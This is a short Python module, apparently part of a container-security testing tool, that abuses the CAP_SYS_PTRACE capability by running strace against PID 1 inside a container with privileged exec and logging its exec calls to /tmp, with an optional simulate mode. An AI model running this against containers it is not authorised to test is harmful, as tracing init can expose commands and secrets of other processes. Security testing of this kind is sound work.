# attacks/cap_sys_ptrace_abuse.py

def run(container, simulate=False):
    print("[*] Running CAP_SYS_PTRACE Abuse...")

    if simulate:
        print(f"[SIMULATE] Would attempt to strace PID 1 inside container '{container.name}'")
        return "Simulated run: No ptrace attempted."

    try:
        # ⚠️ REAL PAYLOAD EXECUTION
        # Attach strace to PID 1 (init process)
        command = "strace -p 1 -o /tmp/ptrace_log.txt -e trace=execve -f -tt & sleep 1"
        container.exec_run(command, privileged=True)

        print("[+] strace attempted on PID 1. Output logged to /tmp/ptrace_log.txt")
        return "Executed: strace on PID 1"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
